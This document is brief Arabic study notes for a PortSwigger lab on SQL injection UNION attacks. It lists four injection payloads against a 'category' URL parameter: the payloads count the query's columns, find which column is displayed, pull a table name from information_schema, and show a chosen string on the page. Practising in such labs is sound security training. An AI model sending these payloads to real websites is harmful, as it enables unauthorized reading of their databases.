# Lab: SQL injection UNION attack, finding a column containing text

https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

- الفكره من الLab ده انك تعرض المحتوي الي انت عاوزه من database ويظهر في الموقع
- اعرف عدد الcolumnواذاي استخدمها واماكنها

```bash
1. 'union select null,null,null-- -

2. 'union select a,b,c-- - => هشوف نهو الي هيتعرض في الشاشه علشان اعرف استهدف العمود نهو 

3. GET /filter?category=Accessories'union select null,table_name,null from information_schema.columns where column_name='admin_option'-- - ==>بتاعه tableده مين ال columnبيقولي ال

4. GET /filter?category=Accessories'union select null,'KES1gL',null-- - ==>ويعرضه في الموقع databaseبتاع الموققع ده بيخليني اعرض اعرض الي عاوزه من 
```
